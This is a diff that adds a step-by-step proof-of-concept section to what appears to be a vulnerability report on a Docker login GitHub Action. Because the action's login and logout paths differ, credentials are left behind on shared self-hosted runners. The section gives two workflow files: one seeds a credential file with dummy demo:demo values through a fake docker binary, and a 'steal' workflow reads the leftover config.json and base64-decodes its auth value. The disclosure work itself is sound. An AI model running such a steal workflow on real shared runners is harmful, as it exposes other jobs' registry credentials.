@@ -249,6 +249,148 @@ On a shared self-hosted runner:
  
 This enables **cross-workflow credential theft**.
 
+# Step by Step reproduction:
+
+This chain demonstrates credential persistence across two workflows on the same self-hosted runner. Workflow A leaves a credential file behind due to the scoped cleanup bypass. Workflow B, running later as the same runner user, finds and reads it. Only dummy credentials (`demo:demo`) are used throughout.
+
+---
+
+**Pre-requisites**
+
+Use a Linux self-hosted runner. Add a unique runner label, for example `lab-runner-1`. Make sure only one runner has that label, so both workflows are guaranteed to hit the same machine.
+
+---
+
+**Workflow A – Seed the leftover credential file**
+
+Create `.github/workflows/poc-selfhosted-seed.yml`:
+
+```yaml
+name: poc-selfhosted-seed
+on:
+  workflow_dispatch:
+
+jobs:
+  seed:
+    runs-on: [self-hosted, linux, lab-runner-1]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install fake docker
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/bin"
+          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          cmd="$1"; shift || true
+          echo "cmd=$cmd DOCKER_CONFIG=${DOCKER_CONFIG:-} args=$*" >> "$RUNNER_TEMP/docker.log"
+
+          if [ "$cmd" = "login" ]; then
+            cat >/dev/null || true
+            mkdir -p "${DOCKER_CONFIG}"
+            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
+            exit 0
+          fi
+
+          if [ "$cmd" = "logout" ]; then
+            rm -f "${DOCKER_CONFIG}/config.json" || true
+            exit 0
+          fi
+
+          exit 0
+          EOF
+          chmod +x "$RUNNER_TEMP/bin/docker"
+          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
+
+      - name: Run vulnerable flow (main + post simulation)
+        shell: bash
+        env:
+          INPUT_USERNAME: demo
+          INPUT_PASSWORD: demo
+          INPUT_SCOPE: myscope
+          INPUT_LOGOUT: "true"
+        run: |
+          set -euo pipefail
+
+          LOGIN_PATH="$HOME/.docker/buildx/config/registry-1.docker.io/myscope"
+          LOGOUT_PATH="$HOME/.docker/buildx/config/myscope"
+
+          node dist/index.js | tee "$RUNNER_TEMP/main.log"
+
+          REG_JSON="$(awk -F'<<ghadelimiter_' '/^registries<<ghadelimiter_/ {flag=1; next} /^ghadelimiter_/ && flag {flag=0} flag {print}' "$GITHUB_STATE" | tr -d '\n')"
+          if [ -z "$REG_JSON" ]; then
+            REG_JSON="$(sed -n 's/^registries=//p' "$GITHUB_STATE" | tail -n1)"
+          fi
+
+          STATE_isPost=true STATE_logout=true STATE_registries="$REG_JSON" node dist/index.js | tee "$RUNNER_TEMP/post.log"
+
+          echo "---- docker log ----"
+          cat "$RUNNER_TEMP/docker.log"
+
+          grep -Fq "cmd=login DOCKER_CONFIG=${LOGIN_PATH} " "$RUNNER_TEMP/docker.log"
+          grep -Fq "cmd=logout DOCKER_CONFIG=${LOGOUT_PATH} " "$RUNNER_TEMP/docker.log"
+
+          test -f "${LOGIN_PATH}/config.json"
+          echo "SEED_DONE=${LOGIN_PATH}/config.json"
+```
+
+---
+
+**Workflow B – Read the leftover credential file**
+
+Create `.github/workflows/poc-selfhosted-steal.yml`:
+
+```yaml
+name: poc-selfhosted-steal
+on:
+  workflow_dispatch:
+
+jobs:
+  steal:
+    runs-on: [self-hosted, linux, lab-runner-1]
+    steps:
+      - name: Read leftover config.json from previous run
+        shell: bash
+        run: |
+          set -euo pipefail
+          TARGET="$HOME/.docker/buildx/config/registry-1.docker.io/myscope/config.json"
+
+          if [ ! -f "$TARGET" ]; then
+            echo "NOT_FOUND: $TARGET"
+            exit 1
+          fi
+
+          echo "FOUND: $TARGET"
+          cat "$TARGET"
+
+          AUTH_B64="$(sed -n 's/.*\"auth\":\"\([^\"]*\)\".*/\1/p' "$TARGET")"
+          if [ -n "$AUTH_B64" ]; then
+            echo -n "DECODED_AUTH="
+            echo "$AUTH_B64" | base64 -d
+            echo
+          fi
+```
+
+---
+
+**Commit and push**
+
+```bash
+git add .github/workflows/poc-selfhosted-seed.yml .github/workflows/poc-selfhosted-steal.yml
+git commit -m "Add self-hosted runner reuse exploit-chain PoC"
+git push
+```
+
+---
+
+**Run order**
+
+Run `poc-selfhosted-seed` first. After it succeeds and you confirm the credential file is present at `~/.docker/buildx/config/registry-1.docker.io/myscope/config.json`, run `poc-selfhosted-steal`. The second workflow will find the leftover file, print its contents, and decode the auth value — confirming that credentials from a previous job are readable by a subsequent workflow running on the same runner.
+
+
+
 ---
 
 ## 8. Severity Assessment
